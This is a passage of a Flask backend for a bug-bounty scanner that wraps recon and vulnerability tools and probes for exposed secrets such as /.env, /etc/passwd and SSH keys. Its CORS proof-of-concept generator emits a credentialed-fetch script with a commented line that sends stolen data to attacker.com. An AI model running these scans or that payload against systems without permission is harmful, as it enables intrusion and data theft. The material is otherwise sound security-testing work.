#!/usr/bin/env python3
"""
Bug Bounty Hunter Pro - Backend API v2
Real scanning engine with live results streaming
Fixed: target sanitization, fingerprint false-positives, scan_list live counts,
       SSE stream stability, HTTP phase logging, tech error filtering
"""
from flask import Flask, request, jsonify, Response, stream_with_context
from flask_cors import CORS
import subprocess, threading, json, os, re, socket, ssl
import urllib.request, urllib.error, urllib.parse
import time, hashlib, random
from datetime import datetime
import dns.resolver
import requests
import concurrent.futures

app = Flask(__name__)
CORS(app)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── In-memory scan storage ────────────────────────────────────────────────────
active_scans = {}

# ─── Target sanitization ──────────────────────────────────────────────────────

def clean_target(raw):
    """
    FIX BUG 3: Properly strip scheme, path, query from any URL input.
    'https://example.com/path?q=1' → 'example.com'
    'example.com'                  → 'example.com'
    """
    raw = raw.strip()
    # Add scheme if missing so urlparse works correctly
    if not raw.startswith(('http://', 'https://')):
        raw = 'https://' + raw
    parsed = urllib.parse.urlparse(raw)
    host = parsed.netloc or parsed.path
    # Strip port if present, unless caller explicitly wants it
    host = host.split(':')[0] if ':' in host else host
    # Strip www. prefix for normalisation (keep for DNS)
    return host.strip('/')

def base_url(target):
    """Return https://target or http://target (tries https first)."""
    if target.startswith(('http://', 'https://')):
        return target.rstrip('/')
    return 'https://' + target

# ─── Utilities ────────────────────────────────────────────────────────────────

def gen_scan_id():
    return hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]

def add_log(scan_id, message, level="info"):
    if scan_id in active_scans:
        active_scans[scan_id]["logs"].append({
            "time": datetime.now().strftime("%H:%M:%S"),
            "level": level,
            "message": message
        })

def add_finding(scan_id, finding):
    if scan_id in active_scans:
        active_scans[scan_id]["findings"].append(finding)
        # FIX BUG 5: keep findings_count in sync in real-time
        active_scans[scan_id]["findings_count"] = len(active_scans[scan_id]["findings"])

# ─── DNS ──────────────────────────────────────────────────────────────────────

def resolve_target(target):
    results = []
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        resolver.lifetime = 5
        for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']:
            try:
                answers = resolver.resolve(target, rtype)
                for r in answers:
                    entry = {"type": rtype, "value": str(r)}
                    if rtype == 'MX':
                        entry["priority"] = r.preference
                        entry["value"] = str(r.exchange)
                    results.append(entry)
            except Exception:
                pass
    except Exception as e:
        results.append({"type": "ERROR", "value": str(e)})
    return results

# ─── Real Tool Wrappers ────────────────────────────────────────────────────────

def _run_cmd(cmd, timeout=30):
    """Run a subprocess command safely, return (stdout, stderr, returncode)."""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, env=dict(os.environ, HOME='/home/user')
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "Command timed out", -1
    except FileNotFoundError:
        return "", f"Tool not found: {cmd[0]}", -1
    except Exception as e:
        return "", str(e), -1

def run_dig(target):
    """Real dig DNS lookup — augments python dns.resolver output."""
    findings = []
    host = clean_target(target)
    out, err, rc = _run_cmd(['dig', '+noall', '+answer', '+short',
                              host, 'A', 'AAAA', 'MX', 'NS', 'TXT'], timeout=15)
    if rc == 0 and out.strip():
        # Parse the raw dig output lines into structured records
        for line in out.strip().splitlines():
            line = line.strip()
            if not line:
                continue
            findings.append({"raw": line})
    # Also try zone transfer (common security finding)
    ns_out, _, _ = _run_cmd(['dig', '+short', 'NS', host], timeout=10)
    ns_servers = [s.strip().rstrip('.') for s in ns_out.strip().splitlines() if s.strip()]
    for ns in ns_servers[:3]:
        axfr_out, _, axfr_rc = _run_cmd(['dig', f'@{ns}', host, 'AXFR', '+short'], timeout=8)
        if axfr_rc == 0 and axfr_out.strip() and len(axfr_out) > 100:
            findings.append({
                "type": "ZONE_TRANSFER",
                "severity": "CRITICAL",
                "ns": ns,
                "description": f"DNS Zone Transfer allowed on {ns}!",
                "data": axfr_out[:500]
            })
    return {"host": host, "raw_output": out, "ns_servers": ns_servers,
            "zone_transfer_findings": [f for f in findings if f.get("type") == "ZONE_TRANSFER"]}

def run_whois(target):
    """Real whois lookup."""
    host = clean_target(target)
    out, err, rc = _run_cmd(['whois', host], timeout=20)
    if rc != 0 or not out.strip():
        return {"host": host, "error": err or "No whois data", "raw": ""}

    info = {"host": host, "raw": out}
    # Extract key fields
    for line in out.splitlines():
        ll = line.lower()
        if ':' not in line:
            continue
        k, _, v = line.partition(':')
        k, v = k.strip(), v.strip()
        kl = k.lower()
        if not v or v.startswith('%') or v.startswith('#'):
            continue
        if kl in ('registrar', 'registrar name') and 'registrar' not in info:
            info['registrar'] = v
        elif kl in ('creation date', 'created', 'registered') and 'created' not in info:
            info['created'] = v
        elif kl in ('updated date', 'last updated', 'updated') and 'updated' not in info:
            info['updated'] = v
        elif kl in ('registry expiry date', 'expiry date', 'expires') and 'expires' not in info:
            info['expires'] = v
        elif kl in ('registrant organization', 'org', 'organisation') and 'org' not in info:
            info['org'] = v
        elif kl in ('name server', 'nserver') and 'nameservers' not in info:
            info.setdefault('nameservers', []).append(v)
        elif kl == 'dnssec' and 'dnssec' not in info:
            info['dnssec'] = v
        elif kl in ('country', 'registrant country') and 'country' not in info:
            info['country'] = v
    return info

def run_whatweb(target):
    """Real whatweb technology detection."""
    url = base_url(target)
    out, err, rc = _run_cmd(['whatweb', '--color=never', '-a', '3', '--log-brief=/dev/stderr',
                              url], timeout=30)
    if not out.strip() and not err.strip():
        out, err, rc = _run_cmd(['whatweb', '--color=never', url], timeout=20)

    technologies = []
    raw_line = (out + err).strip()

    # Parse WhatWeb output: "http://example.com [200 OK] Technology[v1], Tech2"
    # Extract bracketed items
    bracket_items = re.findall(r'(\w[\w\s.-]*?)\[([^\]]*)\]', raw_line)
    seen = set()
    for name, value in bracket_items:
        name = name.strip()
        if name.lower() in ('http', 'https', 'ftp', '') or name in seen:
            continue
        seen.add(name)
        if re.match(r'^\d{3}$', value) or value.lower() in ('ok','found','not found'):
            continue  # skip status codes
        entry = {"name": name, "version": value if value else None, "source": "whatweb"}
        technologies.append(entry)

    # Also grab unbracketed tech names (WhatWeb brief format)
    if not technologies:
        parts = re.split(r',\s*', re.sub(r'\S+://\S+', '', raw_line))
        for part in parts:
            part = part.strip().strip(',').strip()
            if part and len(part) > 1 and not re.match(r'^\[', part):
                # remove trailing version info
                name = re.split(r'\[', part)[0].strip()
                if name and name not in seen:
                    seen.add(name)
                    technologies.append({"name": name, "source": "whatweb"})

    return {"target": url, "technologies": technologies, "raw": raw_line, "rc": rc}

def run_subfinder(target):
    """Real subfinder subdomain enumeration."""
    host = clean_target(target)
    out, err, rc = _run_cmd([
        'subfinder', '-d', host, '-silent', '-timeout', '10',
        '-max-time', '45'
    ], timeout=60)
    subdomains = [s.strip() for s in out.strip().splitlines() if s.strip()]
    # Deduplicate, remove empties
    subdomains = sorted(set(subdomains))
    findings = []
    for sub in subdomains:
        findings.append({
            "subdomain": sub,
            "type": "Subdomain",
            "severity": "INFO",
            "description": f"Subdomain discovered: {sub}"
        })
    return {"host": host, "subdomains": subdomains, "count": len(subdomains),
            "findings": findings, "raw": out[:2000]}

def run_nikto(target):
    """Real nikto web vulnerability scan (quick scan, 60s max)."""
    url = base_url(target)
    nikto_out_file = '/tmp/nikto_scan_out.txt'
    # Remove old output file if exists
    try:
        os.remove(nikto_out_file)
    except Exception:
        pass

    out, err, rc = _run_cmd([
        'nikto', '-h', url,
        '-Tuning', '1234578x',
        '-nointeractive',
        '-timeout', '5',
        '-maxtime', '60s',
        '-Format', 'txt',
        '-output', nikto_out_file
    ], timeout=80)

    # Read the output file if it was created, otherwise use stdout/stderr
    raw = ""
    try:
        with open(nikto_out_file) as f:
            raw = f.read()
    except Exception:
        raw = out + err

    findings = []
    for line in raw.splitlines():
        line = line.strip()
        # Nikto findings start with '+ ' and contain meaningful info
        if not line.startswith('+ '):
            continue
        desc = line[2:].strip()
        # Skip header/summary lines
        if any(skip in desc.lower() for skip in ['target host:', 'target port:', 'start time:',
                                                   'end time:', 'host(s) tested', 'nikto v',
                                                   '0 error(s)', 'requests made']):
            continue
        if len(desc) < 10:
            continue

        sev = "MEDIUM"
        desc_lc = desc.lower()
        if any(x in desc_lc for x in ['critical', 'remote code', 'rce', 'sql inject']):
            sev = "CRITICAL"
        elif any(x in desc_lc for x in ['xss', 'csrf', 'injection', 'traversal', 'execute']):
            sev = "HIGH"
        elif any(x in desc_lc for x in ['information', 'disclosure', 'version', 'outdated',
                                          'banner', 'allows', 'enabled']):
            sev = "LOW"
        findings.append({
            "type": "Nikto Finding",
            "severity": sev,
            "description": desc,
            "source": "nikto"
        })
    return {"target": url, "findings": findings,
            "raw": raw[:3000], "total": len(findings)}

def run_ffuf(target, wordlist=None):
    """Real ffuf directory/endpoint fuzzer."""
    url = base_url(target)
    # Compact wordlist written to temp file
    common_words = [
        'admin', 'login', 'api', 'v1', 'v2', 'backup', 'test', 'debug',
        'config', 'dashboard', 'panel', 'user', 'users', 'account',
        'accounts', 'auth', 'token', 'secret', 'keys', 'upload', 'uploads',
        'files', 'docs', 'swagger', 'graphql', 'health', 'status', 'metrics',
        'env', 'git', 'logs', 'log', 'tmp', 'temp', 'old', 'new', 'bak',
        'sql', 'db', 'database', 'wp-admin', 'administrator', 'phpmyadmin',
        'phpinfo', 'actuator', 'console', 'manager', 'management', 'proxy',
        'api/v1', 'api/v2', 'api/docs', 'swagger.json', 'openapi.json',
        '.env', '.git', 'robots.txt', 'sitemap.xml',
    ]
    wl_path = '/tmp/ffuf_wordlist.txt'
    ffuf_out = '/tmp/ffuf_out.json'
    with open(wl_path, 'w') as f:
        f.write('\n'.join(common_words))
    # Remove old output
    try: os.remove(ffuf_out)
    except Exception: pass

    out, err, rc = _run_cmd([
        'ffuf', '-u', f'{url}/FUZZ',
        '-w', wl_path,
        '-mc', '200,201,204,301,302,307,401,403',
        '-t', '20',
        '-timeout', '5',
        '-of', 'json', '-o', ffuf_out,
        '-noninteractive',
    ], timeout=70)

    findings = []
    try:
        with open(ffuf_out) as f:
            data = json.load(f)
        for result in data.get('results', []):
            word = result.get('input', {}).get('FUZZ', '')
            status = result.get('status', 0)
            length = result.get('length', 0)
            full_url = result.get('url', f'{url}/{word}')
            sev = "LOW"
            wl = word.lower()
            if any(x in wl for x in ['admin', 'config', 'backup', 'secret', '.env', 'sql',
                                       'db', '.git', 'wp-admin', 'phpmyadmin', 'keys']):
                sev = "HIGH"
            elif any(x in wl for x in ['api', 'swagger', 'graphql', 'actuator', 'debug',
                                         'console', 'dashboard', 'management']):
                sev = "MEDIUM"
            findings.append({
                "type": "Directory Found",
                "severity": sev,
                "url": full_url,
                "status": status,
                "length": length,
                "word": word,
                "description": f"/{word} → HTTP {status} ({length} bytes)"
            })
    except Exception:
        # fallback: try to parse any stdout lines
        for line in (out or '').strip().splitlines():
            line = line.strip()
            if line and not line.startswith(':'):
                findings.append({"type": "ffuf result", "severity": "INFO",
                                  "description": line})

    return {"target": url, "findings": findings, "count": len(findings),
            "raw": (out or '')[:2000]}

def run_nuclei(target, severity='medium,high,critical', templates='default-logins,exposed-panels,takeovers,misconfigurations'):
    """Real nuclei vulnerability scan."""
    url = base_url(target)
    # Update templates once (silently if already up to date)
    _run_cmd(['nuclei', '-update-templates', '-silent'], timeout=30)

    out, err, rc = _run_cmd([
        'nuclei', '-u', url,
        '-severity', severity,
        '-tags', 'cve,exposure,misconfig',
        '-rl', '10',  # rate limit requests/sec
        '-c', '10',   # concurrency
        '-timeout', '5',
        '-duc',       # disable update check
        '-silent',
        '-j',         # JSON output
        '-no-color',
        '-time-limit', '120'
    ], timeout=150)

    findings = []
    raw = out + err
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            item = json.loads(line)
            sev_map = {'critical': 'CRITICAL', 'high': 'HIGH', 'medium': 'MEDIUM',
                       'low': 'LOW', 'info': 'INFO', 'unknown': 'INFO'}
            sev = sev_map.get(item.get('info', {}).get('severity', 'info').lower(), 'INFO')
            findings.append({
                "type": "Nuclei Finding",
                "severity": sev,
                "template": item.get('template-id', ''),
                "name": item.get('info', {}).get('name', ''),
                "url": item.get('matched-at', url),
                "description": item.get('info', {}).get('description', ''),
                "tags": ', '.join(item.get('info', {}).get('tags', [])),
                "source": "nuclei"
            })
        except json.JSONDecodeError:
            # Non-JSON output line — skip
            pass
    return {"target": url, "findings": findings, "count": len(findings),
            "raw": raw[:3000]}

# ─── HTTP Probe ───────────────────────────────────────────────────────────────

def get_http_info(target):
    """
    FIX BUG 9: Try HTTPS first, fall back to HTTP, always log result.
    Returns dict with status, server, headers, redirect_url, protocol_used.
    """
    for scheme in ['https', 'http']:
        url = f"{scheme}://{target}"
        try:
            resp = requests.get(url, timeout=6, allow_redirects=True, verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/2.0'})
            headers = dict(resp.headers)
            return {
                "status": resp.status_code,
                "url": resp.url,
                "protocol": scheme.upper(),
                "server": headers.get("Server", ""),
                "x_powered_by": headers.get("X-Powered-By", ""),
                "content_type": headers.get("Content-Type", ""),
                "response_time": round(resp.elapsed.total_seconds(), 3),
                "headers": headers,
                "content_length": len(resp.content),
                "error": None
            }
        except requests.exceptions.SSLError:
            continue  # fall back to http
        except Exception as e:
            continue
    return {"status": None, "url": target, "protocol": "UNKNOWN", "server": "",
            "error": "Host unreachable or no HTTP/HTTPS service running", "headers": {}}

# ─── Port Scanner ─────────────────────────────────────────────────────────────

def check_port(host, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except Exception:
        return False

PORT_SERVICES = {
    21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
    80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS", 445:"SMB",
    465:"SMTPS", 587:"SMTP/TLS", 993:"IMAPS", 995:"POP3S",
    1433:"MSSQL", 3306:"MySQL", 3389:"RDP", 5432:"PostgreSQL",
    5900:"VNC", 6379:"Redis", 8080:"HTTP-Alt", 8443:"HTTPS-Alt",
    8888:"HTTP-Alt", 9200:"Elasticsearch", 27017:"MongoDB",
    5984:"CouchDB", 2375:"Docker", 6443:"Kubernetes", 11211:"Memcached",
    5000:"Flask/Dev", 8000:"HTTP-Dev", 4443:"HTTPS-Alt", 3000:"HTTP-Dev"
}
DANGEROUS_PORTS = {21, 23, 3306, 5432, 6379, 27017, 2375, 9200, 5984, 11211}

def grab_banner(ip, port, timeout=1.5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if port in (80, 8080, 8000, 8888):
            s.send(b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
        elif port in (443, 8443, 4443):
            s.close(); return ""
        else:
            s.send(b"\r\n")
        banner = s.recv(256).decode('utf-8', errors='ignore').strip()
        s.close()
        return banner[:120]
    except Exception:
        return ""

def scan_ports_fast(host, ports=None):
    if ports is None:
        ports = sorted(PORT_SERVICES.keys())
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host

    open_ports = []
    def check(port):
        if check_port(ip, port, timeout=1.5):
            return {"port": port, "state": "open",
                    "service": PORT_SERVICES.get(port, "unknown"),
                    "banner": grab_banner(ip, port)}
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        for result in ex.map(check, ports):
            if result:
                open_ports.append(result)

    return sorted(open_ports, key=lambda x: x["port"])

# ─── SSL/TLS ──────────────────────────────────────────────────────────────────

def check_ssl_tls(host):
    results = {"host": host, "port": 443, "findings": [], "certificate": {}}
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=8) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                cert = s.getpeercert()
                cipher = s.cipher()
                version = s.version()
                results["certificate"] = {
                    "subject": dict(x[0] for x in cert.get("subject", [])),
                    "issuer": dict(x[0] for x in cert.get("issuer", [])),
                    "not_before": cert.get("notBefore"),
                    "not_after": cert.get("notAfter"),
                    "san": cert.get("subjectAltName", []),
                    "serial": cert.get("serialNumber", "")
                }
                results["cipher"] = {"name": cipher[0], "version": cipher[1], "bits": cipher[2]}
                results["tls_version"] = version

                if cipher[2] and cipher[2] < 128:
                    results["findings"].append({
                        "type": "Weak Cipher", "severity": "HIGH",
                        "description": f"Weak cipher {cipher[2]} bits ({cipher[0]})",
                        "remediation": "Use AES-256 or stronger ciphers"
                    })
                if version in ("TLSv1", "TLSv1.1", "SSLv2", "SSLv3"):
                    results["findings"].append({
                        "type": "Outdated TLS", "severity": "HIGH",
                        "description": f"Outdated TLS version: {version}",
                        "remediation": "Disable TLS 1.0/1.1, enforce TLS 1.2+"
                    })
    except ssl.SSLCertVerificationError as e:
        results["findings"].append({
            "type": "SSL Certificate Error", "severity": "HIGH",
            "description": f"Certificate verification failed: {e}",
            "remediation": "Install a valid SSL certificate from a trusted CA"
        })
    except ConnectionRefusedError:
        results["error"] = "Port 443 closed – no HTTPS service"
    except socket.timeout:
        results["error"] = "Connection timed out"
    except Exception as e:
        results["error"] = str(e)
    return results

# ─── Security Headers ─────────────────────────────────────────────────────────

def check_security_headers(target):
    url = base_url(target)
    findings = []
    REQUIRED = {
        "Strict-Transport-Security": ("HIGH", "Missing HSTS – allows downgrade attacks"),
        "Content-Security-Policy":   ("HIGH", "Missing CSP – allows XSS attacks"),
        "X-Frame-Options":           ("MEDIUM", "Missing X-Frame-Options – allows clickjacking"),
        "X-Content-Type-Options":    ("MEDIUM", "Missing X-Content-Type-Options – allows MIME sniffing"),
        "Referrer-Policy":           ("LOW",  "Missing Referrer-Policy – may leak sensitive URLs"),
        "Permissions-Policy":        ("LOW",  "Missing Permissions-Policy header"),
        "X-XSS-Protection":          ("LOW",  "Missing X-XSS-Protection header"),
        "Cache-Control":             ("INFO", "Cache-Control not set"),
    }
    try:
        resp = requests.get(url, timeout=8, verify=False, allow_redirects=True,
                            headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/2.0'})
        h = resp.headers

        for header, (sev, desc) in REQUIRED.items():
            if header not in h:
                findings.append({
                    "type": "Missing Security Header", "header": header,
                    "severity": sev, "description": desc,
                    "remediation": f"Add '{header}' with an appropriate value"
                })

        # Server version disclosure
        server = h.get("Server", "")
        if server and re.search(r'[\d.]{3,}', server):
            findings.append({
                "type": "Information Disclosure", "header": "Server",
                "value": server, "severity": "LOW",
                "description": f"Server header reveals version: {server}",
                "remediation": "Strip version from Server header"
            })

        xpb = h.get("X-Powered-By", "")
        if xpb:
            findings.append({
                "type": "Information Disclosure", "header": "X-Powered-By",
                "value": xpb, "severity": "LOW",
                "description": f"X-Powered-By reveals tech stack: {xpb}",
                "remediation": "Remove X-Powered-By header"
            })

        # Cookie flags
        for sc in h.get_all("Set-Cookie", []) if hasattr(h, 'get_all') else [h.get("Set-Cookie","")]:
            if not sc: continue
            sc_l = sc.lower()
            if "httponly" not in sc_l:
                findings.append({"type":"Cookie Security","severity":"MEDIUM",
                    "description":"Cookie missing HttpOnly flag",
                    "remediation":"Add HttpOnly to all session cookies"})
            if "secure" not in sc_l:
                findings.append({"type":"Cookie Security","severity":"MEDIUM",
                    "description":"Cookie missing Secure flag",
                    "remediation":"Add Secure flag to all cookies sent over HTTPS"})
            if "samesite" not in sc_l:
                findings.append({"type":"Cookie Security","severity":"MEDIUM",
                    "description":"Cookie missing SameSite attribute – CSRF risk",
                    "remediation":"Add SameSite=Strict or SameSite=Lax"})

        return {
            "url": resp.url, "status": resp.status_code,
            "headers_checked": len(REQUIRED), "findings": findings,
            "response_headers": dict(h)
        }
    except Exception as e:
        return {"url": url, "error": str(e), "findings": [], "headers_checked": 0}

# ─── CORS ─────────────────────────────────────────────────────────────────────

def check_cors_misconfiguration(target):
    url = base_url(target)
    findings = []
    parsed = urllib.parse.urlparse(url)
    domain_parts = parsed.netloc.split('.')
    parent = '.'.join(domain_parts[-2:]) if len(domain_parts) >= 2 else parsed.netloc

    test_origins = [
        "https://evil.com",
        "https://attacker.com",
        "null",
        f"https://evil.{parent}",
        f"https://{parsed.netloc}.evil.com",
    ]

    for origin in test_origins:
        try:
            resp = requests.get(url, timeout=5, verify=False,
                                headers={'User-Agent':'Mozilla/5.0','Origin':origin})
            acao = resp.headers.get('Access-Control-Allow-Origin','')
            acac = resp.headers.get('Access-Control-Allow-Credentials','').lower()
            if acao and (acao == origin or acao == '*'):
                sev = "CRITICAL" if (acac == 'true' and acao != '*') else "HIGH"
                findings.append({
                    "type": "CORS Misconfiguration",
                    "severity": sev,
                    "origin_tested": origin,
                    "acao_header": acao,
                    "acac_header": acac,
                    "description": f"CORS allows '{origin}'" + (" with credentials!" if acac=='true' else ""),
                    "poc": _cors_poc(url, origin),
                    "remediation": "Whitelist trusted origins. Never reflect arbitrary Origin. Avoid wildcard with credentials."
                })
        except Exception:
            pass
    return findings

def _cors_poc(url, origin):
    return f"""<!-- CORS PoC – paste into attacker.com page -->
<script>
fetch('{url}', {{credentials:'include', headers:{{Origin:'{origin}'}}}})
  .then(r => r.text())
  .then(d => {{
    // Data stolen from target!
    console.log(d.substring(0,300));
    // Exfiltrate: fetch('https://attacker.com/?x='+btoa(d))
  }});
</script>"""

# ─── Tech Fingerprinting ──────────────────────────────────────────────────────

# FIX BUG 4: Use stricter signature matching to avoid false-positives
TECH_SIGS = [
    # (pattern, name, category, match_in)
    # match_in: 'server_header','xpb_header','cookie_header','content','any_header'
    (r'nginx/?[\d.]?',        "Nginx",         "web-server",  "server_header"),
    (r'apache/?[\d.]?',       "Apache",        "web-server",  "server_header"),
    (r'microsoft-iis/?[\d.]?',"Microsoft IIS", "web-server",  "server_header"),
    (r'lighttpd/?[\d.]?',     "Lighttpd",      "web-server",  "server_header"),
    (r'openresty',            "OpenResty",     "web-server",  "server_header"),
    (r'cloudflare',           "Cloudflare",    "cdn",         "server_header"),
    (r'cloudfront',           "CloudFront",    "cdn",         "any_header"),
    (r'fastly',               "Fastly",        "cdn",         "any_header"),
    (r'akamai',               "Akamai",        "cdn",         "any_header"),
    (r'php/?[\d.]+',          "PHP",           "backend",     "xpb_header"),
    (r'asp\.net',             "ASP.NET",       "backend",     "xpb_header"),
    (r'express',              "Express.js",    "backend",     "xpb_header"),
    (r'wp-content|wp-includes|wp-json',
                              "WordPress",     "cms",         "content"),
    (r'/sites/default/files|drupal\.js',
                              "Drupal",        "cms",         "content"),
    (r'joomla!|/components/com_',
                              "Joomla",        "cms",         "content"),
    (r'<script[^>]+react',    "React",         "frontend",    "content"),
    (r'__next|_next/static',  "Next.js",       "frontend",    "content"),
    (r'ng-version|angular',   "Angular",       "frontend",    "content"),
    (r'vue\.js|__vue',        "Vue.js",        "frontend",    "content"),
    (r'jquery[\/\s-][\d.]+',  "jQuery",        "frontend",    "content"),
    (r'x-shopify-shop',       "Shopify",       "e-commerce",  "any_header"),
    (r'magento',              "Magento",       "e-commerce",  "content"),
    (r'x-amz-|amazonaws\.com',"AWS",           "cloud",       "any_header"),
    (r'x-ms-|\.azurewebsites',"Azure",         "cloud",       "any_header"),
    (r'google-cloud',         "Google Cloud",  "cloud",       "any_header"),
    (r'gtag\(|google-analytics\.com',
                              "Google Analytics","analytics", "content"),
    (r'laravel_session',      "Laravel",       "framework",   "cookie_header"),
    (r'django|csrftoken',     "Django",        "framework",   "cookie_header"),
    (r'_rails_session|x-powered-by.*phusion',
                              "Ruby on Rails", "framework",   "any_header"),
]

def fingerprint_tech(target):
    """
    FIX: Follow redirects fully, probe multiple URLs (root, /index, /login),
    aggregate headers and content across all responses for richer detection.
    """
    base = base_url(target)
    found = {}  # name → entry (deduplicate)

    # Probe these paths to maximise detection surface
    probe_paths = ['/', '/index.php', '/index.html', '/login', '/wp-login.php',
                   '/admin', '/app', '/dashboard']

    all_content_lc   = ""
    all_headers_lc   = ""
    server_header    = ""
    xpb_header_raw   = ""
    cookie_header    = ""

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 BugBountyHunter/2.0'})

    for path in probe_paths:
        try:
            url = base.rstrip('/') + path
            resp = session.get(url, timeout=8, verify=False,
                               allow_redirects=True, stream=False)
            h = resp.headers

            if not server_header:
                server_header  = h.get("Server", "").lower()
            if not xpb_header_raw:
                xpb_header_raw = h.get("X-Powered-By", "")
            cookie_header += " " + h.get("Set-Cookie", "").lower()
            all_headers_lc += " " + " ".join(
                f"{k.lower()}: {v.lower()}" for k, v in h.items())
            # Only store first 500 KB of content
            all_content_lc += " " + resp.text[:500_000].lower()

            # Stop probing deeply after getting a good response
            if resp.status_code == 200 and len(resp.text) > 500:
                break
        except Exception:
            continue

    xpb_header = xpb_header_raw.lower()

    for pattern, name, category, match_in in TECH_SIGS:
        if name in found:
            continue
        haystack = {
            "server_header": server_header,
            "xpb_header":    xpb_header,
            "cookie_header": cookie_header,
            "content":       all_content_lc,
            "any_header":    all_headers_lc,
        }.get(match_in, "")

        if re.search(pattern, haystack, re.IGNORECASE):
            m = re.search(pattern, haystack, re.IGNORECASE)
            ver = None
            if m and '/' in m.group():
                ver = m.group().split('/')[-1].strip()
            found[name] = {"name": name, "category": category,
                           "source": match_in.replace('_header','').replace('_',' ')}
            if ver:
                found[name]["version"] = ver

    # Always expose raw Server header if no specific web-server tech matched
    if server_header:
        cats_found = {v["category"] for v in found.values()}
        if "web-server" not in cats_found:
            found["_server"] = {"name": server_header.title(), "category": "web-server",
                                "source": "server header"}

    # Always expose X-Powered-By
    if xpb_header_raw and xpb_header_raw.lower() not in {v["name"].lower() for v in found.values()}:
        found["_xpb"] = {"name": xpb_header_raw, "category": "backend",
                         "source": "X-Powered-By header"}

    return list(found.values())

# ─── Path Discovery ───────────────────────────────────────────────────────────

PATHS_TO_CHECK = [
    # Config / secrets (CRITICAL)
    "/.env", "/.env.local", "/.env.backup", "/.env.production", "/.env.dev",
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/config.php", "/config.yml", "/config.yaml", "/settings.py", "/settings.php",
    "/.htaccess", "/web.config", "/.htpasswd",
    "/wp-config.php", "/wp-config.php.bak",
    # Backups
    "/backup", "/backup.zip", "/backup.tar.gz", "/db.sql", "/dump.sql",
    "/database.sql", "/backup.sql", "/site.tar.gz", "/www.tar.gz",
    # Admin panels
    "/admin", "/admin/", "/admin/login", "/admin/dashboard",
    "/administrator", "/administrator/index.php",
    "/wp-admin", "/wp-admin/", "/wp-login.php",
    "/panel", "/panel/", "/dashboard", "/_admin", "/manage", "/cp",
    "/control", "/admin1", "/admin2", "/superuser",
    # CMS
    "/xmlrpc.php", "/wp-json/wp/v2/users", "/wp-json/wp/v2/posts",
    "/user/login", "/user/register",
    # Info / debug
    "/phpinfo.php", "/info.php", "/test.php", "/debug", "/debug.php",
    "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/mappings", "/actuator/beans", "/actuator/loggers",
    "/health", "/healthz", "/status", "/metrics", "/ping", "/ready",
    "/server-status", "/server-info",
    # API docs
    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/docs",
    "/api/swagger", "/api/swagger-ui",
    "/swagger.json", "/swagger/v1/swagger.json", "/openapi.json",
    "/graphql", "/graphiql", "/graphql/console",
    "/redoc", "/api-docs", "/docs",
    # Well-known
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/.well-known/security.txt", "/.well-known/openid-configuration",
    "/.well-known/assetlinks.json", "/.well-known/apple-app-site-association",
    # Source leaks
    "/.DS_Store", "/package.json", "/composer.json", "/Gemfile",
    "/requirements.txt", "/yarn.lock", "/package-lock.json",
    "/composer.lock", "/Pipfile",
    # Login
    "/login", "/signin", "/auth/login", "/account/login",
    "/auth/signin", "/oauth/authorize", "/oauth2/authorize",
    # Misc
    "/console", "/shell", "/.ssh/authorized_keys",
    "/etc/passwd", "/proc/self/environ",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/trace.axd", "/elmah.axd", "/webresource.axd",
]

def check_common_paths(target):
    # FIX BUG 3: accept both raw domain and full URL
    url = base_url(target)
    results = []

    def check_path(path):
        try:
            full_url = url.rstrip('/') + path
            resp = requests.get(full_url, timeout=5, verify=False,
                                allow_redirects=False,
                                headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/2.0'})
            code = resp.status_code
            if code not in (200, 301, 302, 307, 308, 401, 403):
                return None

            p_lc = path.lower()
            sev, vtype = "INFO", "Endpoint Discovered"

            if code == 200:
                if any(x in p_lc for x in ['.env', '.git', 'config', 'backup', 'dump', '.sql',
                                             'settings', '.htpasswd', 'wp-config', 'passwd',
                                             'authorized_keys', 'environ']):
                    sev, vtype = "CRITICAL", "Sensitive File Exposed"
                elif any(x in p_lc for x in ['/admin', '/administrator', '/wp-admin', '/panel',
                                               '/cp', '/control', '/superuser', 'console', 'shell']):
                    sev, vtype = "HIGH", "Admin Panel Found"
                elif any(x in p_lc for x in ['phpinfo', 'actuator', '/debug', 'xmlrpc',
                                               'server-status', 'server-info', 'elmah', 'trace']):
                    sev, vtype = "HIGH", "Debug / Info Endpoint"
                elif any(x in p_lc for x in ['api', 'swagger', 'graphql', 'openapi', 'redoc',
                                               'api-docs', 'openid']):
                    sev, vtype = "MEDIUM", "API Endpoint Found"
                elif any(x in p_lc for x in ['login', 'signin', 'auth', 'oauth']):
                    sev, vtype = "LOW", "Login Page Found"
                else:
                    sev, vtype = "LOW", "Public Endpoint"
            elif code in (301, 302, 307, 308):
                location = resp.headers.get('Location', '')
                sev, vtype = "INFO", f"Redirect → {location or '?'}"
            elif code == 401:
                sev, vtype = "LOW", "Unauthorised (Resource Exists)"
            elif code == 403:
